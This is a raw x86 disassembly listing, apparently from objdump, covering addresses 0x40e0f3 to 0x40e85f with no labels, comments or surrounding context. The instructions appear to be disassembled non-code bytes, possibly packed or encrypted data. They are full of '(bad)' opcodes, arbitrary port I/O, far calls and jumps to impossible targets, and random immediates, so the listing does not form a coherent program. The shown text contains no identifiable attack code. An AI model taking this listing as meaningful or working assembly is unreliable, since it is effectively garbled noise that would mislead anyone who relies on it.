  40e0f3:	scas   eax,DWORD PTR es:[edi]
  40e0f4:	dec    ebx
  40e0f5:	daa    
  40e0f6:	mov    ebp,0xcd417aad
  40e0fb:	loope  0x40e0ca
  40e0fd:	std    
  40e0fe:	jno    0x40e0a0
  40e100:	ror    dh,0xa
  40e103:	sub    DWORD PTR [ecx-0x386f4f4b],ecx
  40e109:	sub    ebx,DWORD PTR [esp+ebx*8]
  40e10c:	push   0x2c5dec8b
  40e111:	fwait
  40e112:	(bad)  
  40e113:	shl    DWORD PTR [ebx-0x29],1
  40e116:	lods   eax,DWORD PTR ds:[esi]
  40e117:	push   ds
  40e118:	sub    al,0x9e
  40e11a:	push   es
  40e11b:	stos   BYTE PTR es:[edi],al
  40e11c:	and    eax,0x19ea0ea2
  40e121:	data16 jnp 0x40e153
  40e124:	out    dx,al
  40e125:	xchg   esp,eax
  40e126:	sbb    bl,dh
  40e128:	cmp    bh,BYTE PTR [edi+eiz*8]
  40e12b:	shl    BYTE PTR [edi+0x1b1dd46a],1
  40e131:	test   edi,esp
  40e133:	add    ecx,DWORD PTR [esi+0x7d]
  40e136:	push   es
  40e137:	loop   0x40e16c
  40e139:	icebp  
  40e13a:	in     eax,dx
  40e13b:	xor    al,0xf2
  40e13d:	mov    ds:0x25c2f999,al
  40e142:	cmc    
  40e143:	cld    
  40e144:	je     0x40e0ff
  40e146:	cmp    ah,BYTE PTR [esi]
  40e148:	push   ss
  40e149:	js     0x40e160
  40e14b:	in     al,0x92
  40e14d:	cmp    BYTE PTR [edx+0x1e],al
  40e150:	and    DWORD PTR [ebx+0x191a2a3d],edx
  40e156:	sbb    BYTE PTR [edi-0x41],bl
  40e159:	adc    edx,ecx
  40e15b:	ss in  al,dx
  40e15d:	sub    ebp,edi
  40e15f:	in     eax,dx
  40e160:	pop    edi
  40e161:	push   ebx
  40e162:	push   esi
  40e163:	mov    esi,0x669b81e6
  40e168:	imul   ecx,DWORD PTR [ebp+0x7fbba218],0xf9d844cc
  40e172:	(bad)  
  40e173:	retf   
  40e174:	test   eax,0x1d9b3172
  40e179:	xlat   BYTE PTR ds:[ebx]
  40e17a:	jmp    0x40e1db
  40e17c:	xchg   ebx,eax
  40e17d:	inc    edx
  40e17e:	adc    ebx,DWORD PTR [edx+0x48abe38d]
  40e184:	push   edi
  40e185:	sub    DWORD PTR [edi+0x46],edi
  40e188:	retf   0xe0a7
  40e18b:	pop    es
  40e18c:	test   BYTE PTR cs:[ecx+0x56],0x54
  40e191:	frstor ds:0x32fdeee6
  40e197:	push   0xb4a7e04f
  40e19c:	in     eax,0xde
  40e19e:	and    ecx,esi
  40e1a0:	mov    dl,0x7c
  40e1a2:	ins    DWORD PTR es:[edi],dx
  40e1a3:	in     eax,dx
  40e1a4:	push   edi
  40e1a5:	xor    BYTE PTR [ecx+0x3a91f47e],ch
  40e1ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1ad:	or     al,0x2d
  40e1af:	aaa    
  40e1b0:	xor    esp,ecx
  40e1b2:	xchg   BYTE PTR [edi],ah
  40e1b4:	cmp    BYTE PTR [esi+0x7d],bl
  40e1b7:	pop    edx
  40e1b8:	js     0x40e1b2
  40e1ba:	aam    0xad
  40e1bc:	sub    BYTE PTR [esi+0x4c],0xbe
  40e1c0:	cmp    eax,0x918b3b40
  40e1c5:	dec    ebx
  40e1c6:	shl    DWORD PTR [esi],1
  40e1c8:	test   eax,0x57145d0
  40e1cd:	leave  
  40e1ce:	cmc    
  40e1cf:	jle    0x40e205
  40e1d1:	cmp    ecx,ebx
  40e1d3:	dec    ebp
  40e1d4:	(bad)  
  40e1d6:	test   BYTE PTR [edi-0x3],dl
  40e1d9:	fidiv  WORD PTR [ebp+0x54]
  40e1dc:	xchg   BYTE PTR [ecx],dh
  40e1de:	addr16 fwait
  40e1e0:	idiv   esi
  40e1e2:	or     DWORD PTR [esi-0x7540dad1],ecx
  40e1e8:	adc    BYTE PTR [ecx+0xf],dh
  40e1eb:	scas   eax,DWORD PTR es:[edi]
  40e1ec:	mov    ecx,ecx
  40e1ee:	and    DWORD PTR [ebp-0x64399a3b],0xffffffbd
  40e1f5:	sub    al,0x21
  40e1f7:	ret    0xef6b
  40e1fa:	push   es
  40e1fb:	shl    BYTE PTR [ebp-0x382f254d],0xc0
  40e202:	jl     0x40e1a6
  40e204:	xchg   edi,eax
  40e205:	fdiv   st(5),st
  40e207:	daa    
  40e208:	mov    dl,BYTE PTR [ecx]
  40e20a:	js     0x40e260
  40e20c:	push   ss
  40e20d:	sbb    al,0x65
  40e20f:	lock push edi
  40e211:	fild   WORD PTR [esi+0x4c]
  40e214:	adc    DWORD PTR [ebx+0x35],esi
  40e217:	mov    dh,0x29
  40e219:	sbb    esi,DWORD PTR [esi-0x73]
  40e21c:	popa   
  40e21d:	jl     0x40e1b4
  40e21f:	sub    DWORD PTR [eax],ebp
  40e221:	or     cl,BYTE PTR [ebp-0x41f6a20]
  40e227:	mov    al,al
  40e229:	sbb    ebp,DWORD PTR [ebx+0x346993b5]
  40e22f:	out    dx,eax
  40e230:	lods   al,BYTE PTR ds:[esi]
  40e231:	stc    
  40e232:	push   ebp
  40e233:	ins    BYTE PTR es:[edi],dx
  40e234:	ret    
  40e235:	imul   edx,eax,0xffffffdb
  40e238:	mov    cl,BYTE PTR [ebp+0x5f]
  40e23b:	pop    ds
  40e23c:	mov    dh,0xc2
  40e23e:	push   esp
  40e23f:	inc    eax
  40e240:	loopne 0x40e1f9
  40e242:	retf   0x7ff0
  40e245:	sub    DWORD PTR [ecx-0x2084ec31],ebp
  40e24b:	inc    ebx
  40e24c:	dec    ebp
  40e24d:	xlat   BYTE PTR ds:[ebx]
  40e24e:	ins    DWORD PTR es:[edi],dx
  40e24f:	xchg   ebx,eax
  40e250:	stc    
  40e251:	fcomp  DWORD PTR [ebx]
  40e253:	or     edx,edi
  40e255:	(bad)  
  40e256:	pop    ecx
  40e257:	push   eax
  40e258:	pop    eax
  40e259:	ja     0x40e2aa
  40e25b:	jno    0x40e234
  40e25d:	jmp    0xbf226b35
  40e262:	out    0xd1,al
  40e264:	inc    edi
  40e265:	sbb    dl,bh
  40e267:	inc    esp
  40e268:	mov    WORD PTR [ebp+0x49],?
  40e26b:	sbb    edx,DWORD PTR [edx+ecx*1-0x23b7782d]
  40e272:	call   0x9da5:0xa095953b
  40e279:	out    0xbe,eax
  40e27b:	scas   eax,DWORD PTR es:[edi]
  40e27c:	jo     0x40e240
  40e27e:	test   BYTE PTR [ebx-0xa7ef739],ch
  40e284:	jb     0x40e2b7
  40e286:	inc    ebp
  40e287:	lea    ecx,[edi-0x4ce2968a]
  40e28d:	out    0xe2,al
  40e28f:	add    DWORD PTR [ecx],0x56
  40e292:	mov    ebx,0x35a85436
  40e297:	inc    ebp
  40e298:	or     BYTE PTR ds:0xef4944b9,ah
  40e29e:	sub    eax,eax
  40e2a0:	pop    ebx
  40e2a1:	sti    
  40e2a2:	stos   BYTE PTR es:[edi],al
  40e2a3:	push   eax
  40e2a4:	inc    ebx
  40e2a5:	sahf   
  40e2a6:	js     0x40e2ba
  40e2a8:	shr    BYTE PTR [edx+0x67d7353e],cl
  40e2ae:	or     eax,0x70a53768
  40e2b3:	les    ecx,FWORD PTR [edi-0x64832d52]
  40e2b9:	add    al,0x57
  40e2bb:	shl    BYTE PTR [eax-0xb2183e5],1
  40e2c1:	test   al,0xda
  40e2c3:	push   ebx
  40e2c4:	cmp    BYTE PTR [eax-0x1b],ch
  40e2c7:	sbb    al,0x32
  40e2c9:	add    eax,0xde11eee2
  40e2ce:	into   
  40e2cf:	out    0x15,eax
  40e2d1:	mov    dl,0xcf
  40e2d3:	jns    0x40e347
  40e2d5:	mov    dh,0xb5
  40e2d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2d8:	xor    ah,dl
  40e2da:	nop
  40e2db:	inc    esi
  40e2dc:	shr    BYTE PTR [edi+0x49],1
  40e2df:	js     0x40e285
  40e2e1:	jle    0x40e2a9
  40e2e3:	call   0xfbe52bff
  40e2e8:	mov    DWORD PTR [edx-0x781ff94],edi
  40e2ee:	jle    0x40e36e
  40e2f0:	dec    ebx
  40e2f1:	mov    bl,0x19
  40e2f3:	sbb    al,0x95
  40e2f5:	call   0x1668:0x6f6a093b
  40e2fc:	add    ebx,DWORD PTR [eax+0x57]
  40e2ff:	pop    ss
  40e300:	sub    al,0xcf
  40e302:	fld    st(0)
  40e304:	sti    
  40e305:	stos   BYTE PTR es:[edi],al
  40e306:	js     0x40e37f
  40e308:	xor    ch,cl
  40e30a:	scas   al,BYTE PTR es:[edi]
  40e30b:	dec    esp
  40e30c:	mov    al,ds:0x55bbc368
  40e311:	and    edi,edi
  40e313:	push   edx
  40e314:	dec    edx
  40e315:	mov    bl,0xfd
  40e317:	(bad)  
  40e318:	out    dx,al
  40e319:	and    BYTE PTR [edx-0x29],bh
  40e31c:	(bad)  
  40e31d:	stos   DWORD PTR es:[edi],eax
  40e31e:	pop    edi
  40e31f:	adc    edx,DWORD PTR [ebp+0x62e2b081]
  40e325:	dec    ebp
  40e326:	xchg   ebx,eax
  40e327:	cmp    eax,0xa5d61314
  40e32c:	fsin   
  40e32e:	pop    edx
  40e32f:	dec    esp
  40e330:	xor    BYTE PTR [edi+0x150ab4dd],al
  40e336:	jmp    0x26766c07
  40e33b:	(bad)  
  40e33d:	adc    eax,0xf176dea7
  40e342:	pop    esi
  40e343:	push   ecx
  40e344:	inc    esi
  40e345:	punpckhbw mm7,mm7
  40e348:	xor    edx,DWORD PTR [eax-0x78ed65d4]
  40e34e:	push   esp
  40e34f:	xor    edi,DWORD PTR [eax-0x69]
  40e352:	add    al,dl
  40e354:	popa   
  40e355:	inc    edx
  40e356:	mov    ch,0x78
  40e358:	dec    edx
  40e359:	out    dx,eax
  40e35a:	in     al,0xa4
  40e35c:	pop    ss
  40e35d:	jecxz  0x40e35e
  40e35f:	out    dx,eax
  40e360:	push   ds
  40e361:	das    
  40e362:	or     DWORD PTR [edi],eax
  40e364:	inc    eax
  40e365:	lods   al,BYTE PTR ds:[esi]
  40e366:	lahf   
  40e367:	add    DWORD PTR [ebx-0x6f],edx
  40e36a:	and    ebp,edx
  40e36c:	and    bl,BYTE PTR [edx+0x2d]
  40e36f:	and    esp,DWORD PTR [esi-0x1afd1a93]
  40e375:	and    bl,dl
  40e377:	mov    edi,0xca7258af
  40e37c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e37d:	inc    edi
  40e37e:	xchg   BYTE PTR [esi-0x66],dh
  40e381:	fnstsw WORD PTR [esp+eiz*2+0x30]
  40e385:	(bad)  
  40e386:	in     eax,0xc4
  40e388:	push   cs
  40e389:	push   bx
  40e38b:	(bad)  
  40e38c:	cmc    
  40e38d:	dec    ebx
  40e38e:	ret    
  40e38f:	xchg   esp,eax
  40e390:	pop    eax
  40e391:	std    
  40e392:	adc    al,0x1e
  40e394:	inc    edx
  40e395:	daa    
  40e396:	jle    0x40e384
  40e398:	je     0x40e396
  40e39a:	out    0x31,al
  40e39c:	fist   WORD PTR [edx]
  40e39e:	cmp    DWORD PTR [esi-0x58a7b6b4],esp
  40e3a4:	ins    DWORD PTR es:[edi],dx
  40e3a5:	retf   0xe4e2
  40e3a8:	pop    es
  40e3a9:	fdiv   QWORD PTR [edi+0x54]
  40e3ac:	ins    BYTE PTR es:[edi],dx
  40e3ad:	sbb    BYTE PTR [edi],0x17
  40e3b0:	pop    ecx
  40e3b1:	fist   DWORD PTR [esi+0x2ffc5823]
  40e3b7:	push   es
  40e3b8:	jbe    0x40e419
  40e3ba:	or     esi,ebx
  40e3bc:	(bad)  
  40e3bd:	jp     0x40e35c
  40e3bf:	pop    esp
  40e3c0:	cwde   
  40e3c1:	mov    esi,cs
  40e3c3:	fisttp DWORD PTR ds:0xd46bd353
  40e3c9:	std    
  40e3ca:	adc    eax,edi
  40e3cc:	jno    0x40e3f6
  40e3ce:	aam    0x4a
  40e3d0:	es push edx
  40e3d2:	je     0x40e447
  40e3d4:	int3   
  40e3d5:	pop    es
  40e3d6:	enter  0x7832,0x38
  40e3da:	lods   al,BYTE PTR ds:[esi]
  40e3db:	xor    DWORD PTR [edx],ebx
  40e3dd:	sub    bh,BYTE PTR [edx-0x66ba78d0]
  40e3e3:	aam    0xa6
  40e3e5:	mov    edi,DWORD PTR [esi+0x14]
  40e3e8:	ror    DWORD PTR [edx+esi*2-0x63fd0743],cl
  40e3ef:	mov    ds:0x859b95b3,eax
  40e3f4:	test   eax,0x96c656dd
  40e3f9:	(bad)  
  40e3fb:	dec    ebx
  40e3fc:	or     DWORD PTR ds:0x5c112178,0x7e886bf
  40e406:	inc    ebx
  40e407:	push   ss
  40e408:	fwait
  40e409:	and    eax,0x90a72a3e
  40e40e:	dec    edi
  40e40f:	push   cs
  40e410:	mov    cs,ebp
  40e412:	popf   
  40e413:	test   eax,0x72f86407
  40e418:	into   
  40e419:	or     eax,DWORD PTR [ebx+ecx*2-0x4e]
  40e41d:	test   eax,0xf1da1a16
  40e422:	push   ebp
  40e423:	mov    ebp,0x6eec517b
  40e428:	call   0xdfffceef
  40e42d:	or     ebp,DWORD PTR [eax+0x3f0f04dd]
  40e433:	neg    BYTE PTR [edx+0x22]
  40e436:	jge    0x40e43d
  40e438:	push   cs
  40e439:	pop    edx
  40e43a:	aad    0x6e
  40e43c:	test   cl,cl
  40e43e:	push   edx
  40e43f:	and    eax,0x5157e41b
  40e444:	in     al,dx
  40e445:	mov    WORD PTR [eax-0x51],fs
  40e448:	cld    
  40e449:	aam    0xde
  40e44b:	jl     0x40e49e
  40e44d:	cmp    BYTE PTR [esi-0x37],bh
  40e450:	pop    es
  40e451:	ja     0x40e435
  40e453:	mov    al,0xb6
  40e455:	inc    ebx
  40e456:	rol    BYTE PTR [edi+0x769faae9],cl
  40e45c:	ret    0x205d
  40e45f:	xchg   BYTE PTR [esp+ebx*4-0x46b16bf8],cl
  40e466:	outs   dx,DWORD PTR ds:[esi]
  40e467:	in     al,dx
  40e468:	jae    0x40e456
  40e46a:	cdq    
  40e46b:	xchg   edx,eax
  40e46c:	vmptrld QWORD PTR [ecx]
  40e46f:	xor    esp,DWORD PTR [esi-0x302d4558]
  40e475:	das    
  40e476:	test   DWORD PTR [eax+ebx*4],edx
  40e479:	aas    
  40e47a:	cmc    
  40e47b:	inc    ebx
  40e47c:	test   DWORD PTR [ebp+0x2c43fc46],0x238646b3
  40e486:	adc    dl,ch
  40e488:	jae    0x40e40c
  40e48a:	inc    eax
  40e48b:	xor    ch,BYTE PTR [eax]
  40e48d:	mov    bl,0xac
  40e48f:	sbb    esp,DWORD PTR [edi+edi*2-0x5fe4e64c]
  40e496:	stos   BYTE PTR es:[edi],al
  40e497:	jae    0x40e4b9
  40e499:	ret    0xcdd6
  40e49c:	pop    ecx
  40e49d:	jo     0x40e42e
  40e49f:	gs retf 0xc604
  40e4a3:	dec    ebp
  40e4a4:	ins    BYTE PTR es:[edi],dx
  40e4a5:	stos   DWORD PTR es:[edi],eax
  40e4a6:	fistp  QWORD PTR [edx]
  40e4a8:	fs mov bh,0xba
  40e4ab:	sti    
  40e4ac:	sbb    BYTE PTR [esp+ecx*4+0x268527e1],0xac
  40e4b4:	adc    esp,esp
  40e4b6:	mov    ds:0xfb18c0f6,eax
  40e4bb:	loope  0x40e461
  40e4bd:	gs std 
  40e4bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4c0:	mov    al,0xda
  40e4c2:	jae    0x40e516
  40e4c4:	xchg   esi,eax
  40e4c5:	mov    ?,WORD PTR [ecx+0xc585835]
  40e4cb:	jmp    ebx
  40e4cd:	mov    ch,0xb2
  40e4cf:	xor    DWORD PTR [edx],eax
  40e4d1:	ret    0x33a9
  40e4d4:	pop    ds
  40e4d5:	sbb    DWORD PTR [edi+eiz*4+0x19],edx
  40e4d9:	ins    DWORD PTR es:[edi],dx
  40e4da:	xor    DWORD PTR [esi],esp
  40e4dc:	aam    0xff
  40e4de:	addr16 aam 0x4d
  40e4e1:	test   edi,esp
  40e4e3:	repz lea edi,[eax-0x40]
  40e4e7:	int3   
  40e4e8:	pusha  
  40e4e9:	loopne 0x40e4e4
  40e4eb:	or     al,0x84
  40e4ed:	push   0x43d0bea4
  40e4f2:	xchg   esi,eax
  40e4f3:	sar    DWORD PTR [esi+eax*1-0x36],1
  40e4f7:	fldl2e 
  40e4f9:	mov    eax,ds:0x3296d4c8
  40e4fe:	adc    bh,BYTE PTR [ebx]
  40e500:	inc    eax
  40e501:	jbe    0x40e52b
  40e503:	test   al,0x5c
  40e505:	test   esi,esi
  40e507:	inc    edx
  40e508:	ins    DWORD PTR es:[edi],dx
  40e509:	push   eax
  40e50a:	push   eax
  40e50b:	ss mov bl,0x1b
  40e50e:	sbb    esi,DWORD PTR [esi-0x60]
  40e511:	xchg   ebx,eax
  40e512:	mov    ch,0xdd
  40e514:	xchg   DWORD PTR [ebp+0x4689723],ebx
  40e51a:	add    eax,0xbef0b855
  40e51f:	sbb    eax,0x703dc868
  40e524:	in     eax,0x85
  40e526:	jne    0x40e58f
  40e528:	inc    edx
  40e529:	cli    
  40e52a:	iret   
  40e52b:	lods   al,BYTE PTR ds:[esi]
  40e52c:	daa    
  40e52d:	cwde   
  40e52e:	push   esi
  40e52f:	out    0xc6,eax
  40e531:	and    ah,bh
  40e533:	sub    esi,esp
  40e535:	add    DWORD PTR [ebx+0x4a10619f],edi
  40e53b:	push   0xfbf88d00
  40e540:	push   0x67
  40e542:	sti    
  40e543:	xchg   ebx,eax
  40e544:	xchg   edx,eax
  40e545:	or     eax,0x54a17155
  40e54a:	icebp  
  40e54b:	data16 loope 0x40e564
  40e54e:	jmp    0xbac8:0xf4877256
  40e555:	push   bx
  40e557:	call   0xe0504de3
  40e55c:	test   eax,0x39d4bc26
  40e561:	dec    ebp
  40e562:	jmp    0xabe:0xc771524d
  40e569:	pop    ss
  40e56a:	(bad)  
  40e56b:	loopne 0x40e5dc
  40e56d:	fisttp DWORD PTR [ecx-0x28ad5a]
  40e573:	lock test eax,esi
  40e576:	fnstsw WORD PTR [ecx]
  40e578:	push   edi
  40e579:	jmp    0xa3e23b7f
  40e57e:	and    ch,BYTE PTR [ecx+ecx*2+0x1cc20e3]
  40e585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e586:	popa   
  40e587:	sbb    DWORD PTR [ebp+0x1a25024],0xd447b8ac
  40e591:	xor    DWORD PTR [edi+eiz*1],ecx
  40e594:	mov    ebx,0xfa91ae6a
  40e599:	pop    esi
  40e59a:	mov    ebx,0xfd51eeab
  40e59f:	call   0x4ed0:0x7308602a
  40e5a6:	push   ecx
  40e5a7:	xchg   edx,eax
  40e5a8:	sub    ecx,esi
  40e5aa:	xor    bl,BYTE PTR [ecx+0xa]
  40e5ad:	inc    esi
  40e5ae:	stc    
  40e5af:	xor    eax,0x5cf6d4d3
  40e5b4:	xchg   ebp,eax
  40e5b5:	das    
  40e5b6:	ins    DWORD PTR es:[edi],dx
  40e5b7:	inc    ebx
  40e5b8:	mov    al,0xbd
  40e5ba:	not    BYTE PTR [edx+ebx*4-0x7cd276b9]
  40e5c1:	pop    es
  40e5c2:	fistp  DWORD PTR [ebx+0x15]
  40e5c5:	ja     0x40e596
  40e5c7:	xlat   BYTE PTR ds:[ebx]
  40e5c8:	push   0xffeba56c
  40e5cd:	bound  ecx,QWORD PTR [eax]
  40e5cf:	and    DWORD PTR [ecx],edi
  40e5d1:	out    0x7d,eax
  40e5d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5d4:	and    edx,DWORD PTR [ecx]
  40e5d6:	jae    0x40e633
  40e5d8:	rcl    BYTE PTR [edi+0x59],cl
  40e5db:	pop    ds
  40e5dc:	clc    
  40e5dd:	mov    bh,0x40
  40e5df:	pop    ebp
  40e5e0:	std    
  40e5e1:	mov    ds:0x4fc37d1e,al
  40e5e6:	or     al,0x16
  40e5e8:	inc    edx
  40e5e9:	aad    0x36
  40e5eb:	dec    ebx
  40e5ec:	fcomp  st(1)
  40e5ee:	add    eax,DWORD PTR [ecx+0x34]
  40e5f1:	adc    ch,BYTE PTR [edi]
  40e5f3:	push   ebp
  40e5f4:	nop
  40e5f5:	jecxz  0x40e65e
  40e5f7:	xlat   BYTE PTR ds:[ebx]
  40e5f8:	push   cs
  40e5f9:	inc    ebx
  40e5fa:	and    al,0x1
  40e5fc:	mov    WORD PTR [edi+0x35b41ce5],gs
  40e602:	popa   
  40e603:	mov    dl,0x94
  40e605:	xor    edi,DWORD PTR ds:0xfe95b254
  40e60b:	push   0x79e731b0
  40e610:	dec    esp
  40e611:	sub    BYTE PTR [ebx+0x29],ch
  40e614:	repnz scas al,BYTE PTR es:[edi]
  40e616:	clc    
  40e617:	mov    ecx,0x6cd92188
  40e61c:	xchg   BYTE PTR [esi+ebx*4-0x9],cl
  40e620:	and    eax,0xeeaf787e
  40e625:	out    0xe0,al
  40e627:	pop    esp
  40e628:	aad    0xb2
  40e62a:	stos   BYTE PTR es:[edi],al
  40e62b:	sub    eax,0x32c595f1
  40e630:	mov    ch,0x48
  40e632:	jle    0x40e6a8
  40e634:	rol    DWORD PTR [ebx],cl
  40e636:	fist   DWORD PTR [ebp+edx*2+0x76]
  40e63a:	mov    ebp,0xb681554c
  40e63f:	mov    eax,0xbca93862
  40e644:	test   eax,0x724bdf27
  40e649:	or     eax,0xe42f83e6
  40e64e:	fimul  DWORD PTR [ecx-0x5f]
  40e651:	test   DWORD PTR [ebx-0x79],edx
  40e654:	ret    
  40e655:	sbb    ebx,DWORD PTR [edi-0xf]
  40e658:	or     eax,0xe2d3f86e
  40e65d:	push   ecx
  40e65e:	ss pop es
  40e660:	test   al,0xaf
  40e662:	int    0x8f
  40e664:	mov    gs,WORD PTR [ebp+edx*2+0x5935e2fb]
  40e66b:	retf   0xf14
  40e66e:	push   es
  40e66f:	fsub   DWORD PTR [ebp+0x18be2564]
  40e675:	xor    ebp,DWORD PTR [edx+0xfe52f43]
  40e67b:	shl    BYTE PTR [edx],cl
  40e67d:	loope  0x40e66e
  40e67f:	rcl    dl,1
  40e681:	jl     0x40e6bb
  40e683:	push   ds
  40e684:	sbb    eax,0x839063c4
  40e689:	push   0x1f
  40e68b:	add    DWORD PTR [ebp+0x25],edi
  40e68e:	dec    ebp
  40e68f:	addr16 mov al,0xe9
  40e692:	popa   
  40e693:	pop    edi
  40e694:	jle    0x40e711
  40e696:	jnp    0x40e61a
  40e698:	xchg   edi,eax
  40e699:	push   ds
  40e69a:	mov    al,ds:0xac2bd9a6
  40e69f:	or     edx,ebx
  40e6a1:	pop    esp
  40e6a2:	mov    ebp,0x3ac200d
  40e6a7:	and    al,0x37
  40e6a9:	int    0x84
  40e6ab:	iret   
  40e6ac:	cld    
  40e6ad:	daa    
  40e6ae:	sbb    ah,dh
  40e6b0:	pop    ebp
  40e6b1:	mov    bl,BYTE PTR ds:0xc46a3538
  40e6b7:	lods   eax,DWORD PTR ds:[esi]
  40e6b8:	cs addr16 retf 0xe872
  40e6bd:	pop    ss
  40e6be:	(bad)  
  40e6bf:	rcl    DWORD PTR [esi-0x1a],cl
  40e6c2:	pushf  
  40e6c3:	mul    BYTE PTR [ebx]
  40e6c5:	adc    dh,BYTE PTR [ecx+0x42fb4d26]
  40e6cb:	cmp    al,0x76
  40e6cd:	cmp    ebp,DWORD PTR [ebx-0x7cb84528]
  40e6d3:	push   es
  40e6d4:	or     BYTE PTR [ebx],0x4a
  40e6d7:	xor    DWORD PTR [edi-0x78],eax
  40e6da:	cld    
  40e6db:	dec    esp
  40e6dc:	outs   dx,BYTE PTR ds:[esi]
  40e6dd:	xlat   BYTE PTR ds:[ebx]
  40e6de:	(bad)  
  40e6df:	jnp    0x40e6b8
  40e6e1:	sbb    BYTE PTR [esi+0x67],dh
  40e6e4:	pushf  
  40e6e5:	mov    ch,0xbf
  40e6e7:	xor    DWORD PTR [edx+ecx*2+0x1c0b7262],eax
  40e6ee:	arpl   WORD PTR [edi],ax
  40e6f0:	enter  0x7ea2,0x9a
  40e6f4:	sbb    BYTE PTR [esi-0x13bbb3bc],cl
  40e6fa:	pop    esp
  40e6fb:	in     al,dx
  40e6fc:	add    bl,BYTE PTR [ecx]
  40e6fe:	pop    ebx
  40e6ff:	mov    WORD PTR [edx+esi*1-0x2f],ds
  40e703:	test   DWORD PTR [edi-0x6f],0x8da53b82
  40e70a:	cmp    DWORD PTR [edx-0x5a893903],esi
  40e710:	push   esp
  40e711:	(bad)  
  40e712:	outs   dx,BYTE PTR ds:[esi]
  40e713:	mov    ah,BYTE PTR [ebx+0x37]
  40e716:	inc    ebp
  40e717:	pop    ebp
  40e718:	lock adc ah,0x2e
  40e71c:	xchg   ebp,ebp
  40e71e:	out    dx,al
  40e71f:	cmp    dl,BYTE PTR [esi+0x107ddade]
  40e725:	movzx  ebx,ax
  40e728:	inc    ebp
  40e729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e72a:	add    al,0xa3
  40e72c:	(bad)
  40e72f:	mov    dh,ah
  40e731:	adc    edx,DWORD PTR [edx+0x39]
  40e734:	jne    0x40e6b9
  40e736:	inc    ecx
  40e737:	and    edx,DWORD PTR [ecx+0x5e896665]
  40e73d:	jge    0x40e6e9
  40e73f:	xchg   BYTE PTR [edx-0x4c328224],cl
  40e745:	in     al,dx
  40e746:	mov    ds,WORD PTR [esi]
  40e748:	pusha  
  40e749:	fcomip st,st(7)
  40e74b:	icebp  
  40e74c:	icebp  
  40e74d:	jno    0x40e734
  40e74f:	fsubr  QWORD PTR ds:0xb0d6049d
  40e755:	ja     0x40e6fc
  40e757:	ret    
  40e758:	inc    ebp
  40e759:	rcr    BYTE PTR [ebx-0x19],1
  40e75c:	je     0x40e7da
  40e75e:	mov    WORD PTR [ebp-0x6e89a89a],es
  40e764:	mov    dh,0x6f
  40e766:	vunpcklpd ymm7,ymm2,YMMWORD PTR [ebx]
  40e76a:	cld    
  40e76b:	dec    edi
  40e76c:	retf   0x27fd
  40e76f:	inc    eax
  40e770:	out    dx,eax
  40e771:	stos   BYTE PTR es:[edi],al
  40e772:	mov    ebp,0x8f6bb321
  40e777:	add    eax,0xb3dda7ae
  40e77c:	das    
  40e77d:	cmp    ebp,DWORD PTR [ecx]
  40e77f:	adc    al,0x1b
  40e781:	(bad)  
  40e782:	ja     0x40e767
  40e784:	addr16 push edi
  40e786:	stos   DWORD PTR es:[edi],eax
  40e787:	sti    
  40e788:	pop    eax
  40e789:	test   al,0x88
  40e78b:	mov    ecx,0xafb93eb1
  40e790:	and    al,0x3d
  40e792:	inc    esp
  40e793:	jp     0x40e780
  40e795:	xor    al,0x9d
  40e797:	pop    edi
  40e798:	dec    eax
  40e799:	lea    ecx,[ebx+0x3d]
  40e79c:	les    edi,FWORD PTR [eax-0x32]
  40e79f:	(bad)  
  40e7a0:	out    dx,al
  40e7a1:	fsub   st,st(5)
  40e7a3:	xor    bl,bl
  40e7a5:	inc    edx
  40e7a6:	jo     0x40e7aa
  40e7a8:	out    dx,al
  40e7a9:	push   edx
  40e7aa:	sbb    DWORD PTR [eax+0x6a84774],eax
  40e7b0:	or     esp,DWORD PTR [esi-0x53]
  40e7b3:	xor    BYTE PTR [eax],0x74
  40e7b6:	lods   eax,DWORD PTR ds:[esi]
  40e7b7:	cli    
  40e7b8:	xor    al,0xcb
  40e7ba:	pop    ebx
  40e7bb:	dec    esi
  40e7bc:	mov    ebp,0xa6561ccc
  40e7c1:	test   DWORD PTR [ecx-0x3b33d565],ebp
  40e7c7:	call   0x5f1c6255
  40e7cc:	sub    BYTE PTR [ebx+0x9d78c69],bl
  40e7d2:	push   edx
  40e7d3:	jne    0x40e7db
  40e7d5:	scas   eax,DWORD PTR es:[edi]
  40e7d6:	jne    0x40e7e6
  40e7d8:	add    ecx,DWORD PTR [edx+edx*2-0x2]
  40e7dc:	inc    edi
  40e7dd:	dec    ebp
  40e7de:	jns    0x40e7aa
  40e7e0:	pop    ss
  40e7e1:	mov    ah,0x1
  40e7e3:	imul   edx,DWORD PTR [ecx-0x2937b287],0xe53cc23b
  40e7ed:	pop    esi
  40e7ee:	fldenv [ebx-0x3aa85ec]
  40e7f4:	sahf   
  40e7f5:	or     BYTE PTR [edx-0x6897e007],0x93
  40e7fc:	xor    edi,DWORD PTR [eax-0x8]
  40e7ff:	icebp  
  40e800:	(bad)  
  40e802:	in     eax,dx
  40e803:	and    DWORD PTR [ecx+edx*2],ebp
  40e806:	mov    esp,0xcb71feeb
  40e80b:	jmp    0x563f1906
  40e810:	cmp    ah,BYTE PTR [ebx]
  40e812:	adc    al,0xbe
  40e814:	push   esi
  40e815:	pop    ss
  40e816:	pop    ecx
  40e817:	fs daa 
  40e819:	mov    ebp,?
  40e81b:	jnp    0x40e7c7
  40e81d:	iret   
  40e81e:	xor    eax,0xde97e7a1
  40e823:	mov    edi,0xba4e5288
  40e828:	mov    esi,0xf14e600b
  40e82d:	add    BYTE PTR [eax-0x1eb0312c],0xb9
  40e834:	inc    edi
  40e835:	jns    0x40e7ed
  40e837:	xchg   edx,eax
  40e838:	es pop eax
  40e83a:	xchg   DWORD PTR [ebp-0x2d2ad2f7],esp
  40e840:	in     eax,dx
  40e841:	pop    es
  40e842:	rcr    bh,1
  40e844:	and    DWORD PTR [esi],0x9ca31d89
  40e84a:	ss or  bl,ah
  40e84d:	jmp    0x4bfc:0x91ea4b22
  40e854:	out    dx,al
  40e855:	lea    ecx,[ecx-0x4d31095d]
  40e85b:	or     cl,al
  40e85d:	mov    dl,0x7b
  40e85f:	out    0xc9,eax
